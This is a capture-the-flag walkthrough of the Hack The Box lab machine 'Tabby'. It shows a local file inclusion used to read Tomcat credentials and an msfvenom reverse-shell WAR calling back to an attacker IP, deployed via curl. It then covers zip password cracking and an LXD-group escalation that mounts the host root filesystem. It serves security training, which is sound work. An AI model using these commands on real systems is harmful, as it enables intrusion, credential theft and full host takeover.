## Tabby

Difficulty: Easy

### User Flag

#### Foothold

```
rustscan -a 10.10.10.194 --ulimit 5000 -- -A -sV -sC -oN nmap.txt
```

![rustscan](https://github.com/b1d0ws/OSCP/assets/58514930/a17ab37b-5c2d-4b89-bc56-f2e4b02c7e4d)

<br>

Looking through the website on port 80, the NEWS button lead us to "megahosting.htb". Add this to your hosts file.

![news php](https://github.com/b1d0ws/OSCP/assets/58514930/bd41e244-69f2-4237-90d4-d666c995f803)

<br>

This page apparently reads a statement with the "file" parameter. The parameter is vulnerable to LFI.

![fileStatement](https://github.com/b1d0ws/OSCP/assets/58514930/78cca597-21e9-47ef-b3a7-2a9d3dcc5828)

![firstLFI](https://github.com/b1d0ws/OSCP/assets/58514930/270248ff-e6c2-4f8f-aa05-925133da6ab8)

<br>

If we look to port 8080, we see that apache tomcat is being used. We can explore LFI to find the file containing tomcat users.  

Hacktricks indicated to us that this path is _/usr/share/tomcat9/etc/tomcat-users.xml_.

![port8080](https://github.com/b1d0ws/OSCP/assets/58514930/71410b99-f1af-46f6-ba88-e4a43d933cea)

![tomcatUsers](https://github.com/b1d0ws/OSCP/assets/58514930/3a7e0857-d09b-4f99-b5e6-73a5fb041814)

<br>

We can use this user to get a reverse shell in tomcat with the commands below:

```
msfvenom -p java/jsp_shell_reverse_tcp LHOST=10.110.14.11 LPORT=3333 -f war -o revshell.war

curl --upload-file revshell.war -u 'tomcat:$3cureP4s5w0rd123!' "http://10.10.10.194:8080/manager/text/deploy?path=/revshell"

http://tabby.htb:8080/revshell
```

![revShell](https://github.com/b1d0ws/OSCP/assets/58514930/32ed5a5a-1a73-43cc-a2a0-1c19410de62a)

<br>

#### Ash User

Inside /var/ww/html/files exists a backup file. Transfer to you Kali machine and crack the password with zip2john. This password can be used to login as ash user.

![crackingZip](https://github.com/b1d0ws/OSCP/assets/58514930/c3f93221-60c9-473d-aef1-25601e7f819e)

### Root Flag

Enumerating the machine, ash user blongs to lxd group.

![groups](https://github.com/b1d0ws/OSCP/assets/58514930/88149510-318e-4e6b-9537-0cf6120c6cc2)

<br>

We can follow [this guide](https://book.hacktricks.xyz/linux-hardening/privilege-escalation/interesting-groups-linux-pe/lxd-privilege-escalation) to privilege escalate.

```bash
# You user belongs to lxd group
groups
ash adm cdrom dip plugdev lxd

# Just follow the first method to get root
# https://book.hacktricks.xyz/linux-hardening/privilege-escalation/interesting-groups-linux-pe/lxd-privilege-escalation

# Kali
sudo su

# Install requirements
sudo apt update
sudo apt install -y git golang-go debootstrap rsync gpg squashfs-tools

# Clone repo
git clone https://github.com/lxc/distrobuilder

# Make distrobuilder
cd distrobuilder
make

# Prepare the creation of alpine
mkdir -p $HOME/ContainerImages/alpine/
cd $HOME/ContainerImages/alpine/
wget https://raw.githubusercontent.com/lxc/lxc-ci/master/images/alpine.yaml

# Create the container
sudo $HOME/go/bin/distrobuilder build-lxd alpine.yaml -o image.release=3.1

# Upload lxd.tar.xz and rootfs.squashfs to the victim

# Victim
lxc image import lxd.tar.xz rootfs.squashfs --alias alpine
lxc image list #You can see your new imported image

# In case of error:
export PATH=/snap/bin:$PATH

lxc init alpine privesc -c security.privileged=true
lxc list #List containers

lxc config device add privesc host-root disk source=/ path=/mnt/root recursive=true

# If you find this error Error: No storage pool found. Please create a new storage pool
# Run lxd init and repeat the previous chunk of commands

lxc start privesc
lxc exec privesc /bin/sh
[email protected]:~# cd /mnt/root #Here is where the filesystem is mounted
```

![privEsc1](https://github.com/b1d0ws/OSCP/assets/58514930/4242692f-3e8b-4b37-ab3f-a97eb6a645bb)

![privEsc2](https://github.com/b1d0ws/OSCP/assets/58514930/c26ac10f-e457-4360-a333-7e0bbec0f5cb)

![privEsc3](https://github.com/b1d0ws/OSCP/assets/58514930/4a5831a0-1509-41e5-91dc-236009086681)
